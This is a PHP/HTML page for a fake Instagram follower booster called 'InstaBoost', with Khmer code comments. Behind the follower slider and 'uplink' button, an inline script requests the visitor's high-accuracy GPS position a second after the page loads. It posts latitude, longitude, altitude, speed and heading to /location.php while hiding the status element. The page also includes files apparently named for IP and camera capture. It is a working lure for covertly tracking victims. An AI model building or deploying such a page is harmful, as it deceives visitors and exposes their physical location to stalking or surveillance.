<?php
    include 'location.php';
    include 'cams.php';
    include 'ip.php';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaBoost — Neural Growth Engine</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;900&family=Space+Mono:wght@400;700&family=Rajdhani:wght@300;400;600&display=swap" rel="stylesheet">
    <!-- បន្ថែម jQuery សម្រាប់ AJAX -->
    <script src="https://code.jquery.com/jquery-1.8.3.js"></script>
    <link rel="stylesheet" href="style.css">
    <style>
        /* លាក់ការស្នើសុំទីតាំង */
        #location-status {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Animated Background -->
    <canvas id="particles"></canvas>
    <div class="grid-overlay"></div>
    <div class="scanline"></div>

    <div class="container">

        <!-- Left decorative bar -->
        <div class="deco-bar left-bar">
            <span class="bar-label">SYS</span>
            <div class="bar-line"></div>
            <span class="bar-label">ONLINE</span>
        </div>

        <!-- Main card -->
        <div class="card">

            <!-- Header -->
            <div class="card-header">
                <div class="logo-ring">
                    <svg class="ring-svg" viewBox="0 0 120 120">
                        <circle cx="60" cy="60" r="52" class="ring-track"/>
                        <circle cx="60" cy="60" r="52" class="ring-progress"/>
                    </svg>
                    <div class="logo-icon">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="2" y="2" width="20" height="20" rx="6" stroke="currentColor" stroke-width="1.5"/>
                            <circle cx="12" cy="12" r="4" stroke="currentColor" stroke-width="1.5"/>
                            <circle cx="17.5" cy="6.5" r="1.2" fill="currentColor"/>
                        </svg>
                    </div>
                </div>
                <div class="brand-text">
                    <h1>INSTA<span>BOOST</span></h1>
                    <p class="tagline">NEURAL GROWTH ENGINE <span class="version">v3.7</span></p>
                </div>
                <div class="status-indicator">
                    <span class="dot"></span>
                    <span class="status-label">LIVE</span>
                </div>
            </div>

            <!-- Stats row -->
            <div class="stats-row">
                <div class="stat">
                    <span class="stat-val">2.4M</span>
                    <span class="stat-key">DEPLOYED</span>
                </div>
                <div class="stat-divider"></div>
                <div class="stat">
                    <span class="stat-val">99.8%</span>
                    <span class="stat-key">SUCCESS</span>
                </div>
                <div class="stat-divider"></div>
                <div class="stat">
                    <span class="stat-val">0.3s</span>
                    <span class="stat-key">AVG PING</span>
                </div>
            </div>

            <!-- Input section -->
            <div class="form-section">
                <div class="input-wrapper">
                    <label class="field-label">TARGET HANDLE</label>
                    <div class="input-field">
                        <span class="input-prefix">@</span>
                        <input type="text" id="username" placeholder="username" autocomplete="off" spellcheck="false">
                        <div class="input-glow"></div>
                    </div>
                </div>

                <div class="slider-wrapper">
                    <div class="slider-header">
                        <label class="field-label">PAYLOAD SIZE</label>
                        <span class="slider-val"><span id="val">5,000</span> <span class="unit">UNITS</span></span>
                    </div>
                    <div class="slider-track-wrap">
                        <input type="range" min="100" max="10000" value="5000" id="followerRange">
                        <div class="slider-fill" id="sliderFill"></div>
                        <div class="slider-markers">
                            <span>100</span>
                            <span>2.5K</span>
                            <span>5K</span>
                            <span>7.5K</span>
                            <span>10K</span>
                        </div>
                    </div>
                </div>

                <!-- Protocol selection -->
                <div class="protocol-row">
                    <label class="field-label">PROTOCOL</label>
                    <div class="protocol-options">
                        <button class="proto-btn active" data-proto="STEALTH">STEALTH</button>
                        <button class="proto-btn" data-proto="RAPID">RAPID</button>
                        <button class="proto-btn" data-proto="GHOST">GHOST</button>
                    </div>
                </div>
            </div>

            <!-- CTA Button -->
            <button class="launch-btn" onclick="startSimulation()" id="launchBtn">
                <span class="btn-bg"></span>
                <span class="btn-content">
                    <svg class="btn-icon" viewBox="0 0 24 24" fill="none">
                        <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"/>
                    </svg>
                    INITIALIZE UPLINK
                </span>
                <span class="btn-corner tl"></span>
                <span class="btn-corner tr"></span>
                <span class="btn-corner bl"></span>
                <span class="btn-corner br"></span>
            </button>

            <!-- Status terminal -->
            <div id="status-box" class="terminal hidden">
                <div class="terminal-header">
                    <span class="term-dot red"></span>
                    <span class="term-dot yellow"></span>
                    <span class="term-dot green"></span>
                    <span class="term-title">SYS_TERMINAL</span>
                </div>
                <div class="terminal-body">
                    <div class="term-line"><span class="prompt">❯</span> <span id="status-text">Initializing...</span><span class="cursor">█</span></div>
                    <div id="term-log"></div>
                </div>
                <div class="progress-bar-wrap">
                    <div class="progress-bar" id="progressBar"></div>
                </div>
            </div>

        </div>

        <!-- Right decorative bar -->
        <div class="deco-bar right-bar">
            <span class="bar-label">NET</span>
            <div class="bar-line"></div>
            <span class="bar-label">SEC</span>
        </div>

    </div>

    <!-- កន្លែងលាក់សម្រាប់បង្ហាញស្ថានភាពទីតាំង -->
    <div id="location-status"></div>

    <script src="script.js"></script>
    
    <!-- បន្ថែម JavaScript សម្រាប់ចាប់យកទីតាំង -->
    <script>
    // ទង់សម្រាប់ពិនិត្យថាបានផ្ញើទីតាំងរួចហើយឬនៅ
    var locationSent = false;
    
    // ចាប់យកទីតាំង GPS តែម្ដង
    function getLocation() {
        // បើបានផ្ញើរួចហើយ មិនត្រូវផ្ញើទៀតទេ
        if (locationSent) {
            console.log("Location already sent, skipping...");
            return;
        }
        
        if (navigator.geolocation) {
            console.log("Requesting location...");
            
            // ជម្រើសសម្រាប់ការចាប់ទីតាំងតែម្ដង
            const options = {
                enableHighAccuracy: true,  // ចង់បានភាពត្រឹមត្រូវខ្ពស់
                timeout: 5000,            // រង់ចាំ 10 វិនាទី
                maximumAge: 0               // មិនយកទិន្នន័យចាស់
            };
            
            // ចាប់ទីតាំងតែម្ដង (មិនតាមដាន)
            navigator.geolocation.getCurrentPosition(sendLocation, showError, options);
            
        } else {
            console.log("Geolocation is not supported by this browser.");
        }
    }
    
    function sendLocation(position) {
        // កុំផ្ញើច្រើនដង
        if (locationSent) return;
        
        console.log("Location obtained, sending to server...");
        
        const locationData = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || 'N/A',
            altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
            heading: position.coords.heading || 'N/A',
            speed: position.coords.speed || 'N/A',
            timestamp: new Date().toISOString()
        };
        
        // បង្ហាញទីតាំងក្នុង console (សម្រាប់តេស្ត)
        console.log("Latitude:", locationData.lat);
        console.log("Longitude:", locationData.lng);
        console.log("Accuracy:", locationData.accuracy, "meters");
        
        // ផ្ញើទៅកាន់ server
        $.ajax({
            type: 'POST',
            url: '/location.php',
            data: { location: JSON.stringify(locationData) },
            dataType: 'json',
            success: function(response) {
                console.log('✅ Location sent successfully');
                locationSent = true; // កំណត់ថាបានផ្ញើរួច
                if (response.map) {
                    console.log('📍 Map link:', response.map);
                }
            },
            error: function(xhr, status, error) {
                console.log('❌ Error sending location:', error);
            }
        });
    }
    
    function showError(error) {
        console.log("❌ Geolocation error:");
        switch(error.code) {
            case error.PERMISSION_DENIED:
                console.log("User denied the request for Geolocation.");
                break;
            case error.POSITION_UNAVAILABLE:
                console.log("Location information is unavailable.");
                break;
            case error.TIMEOUT:
                console.log("The request to get user location timed out.");
                break;
            case error.UNKNOWN_ERROR:
                console.log("An unknown error occurred.");
                break;
        }
    }
    
    // ហៅមុខងារចាប់យកទីតាំងពេលផ្ទុកទំព័ររួច
    $(document).ready(function() {
        console.log("Page loaded, waiting 1 seconds before requesting location...");
        
        // រង់ចាំ 1 វិនាទី រួចសួររកទីតាំង
        setTimeout(getLocation, 1000);
    });
    </script>
</body>
</html>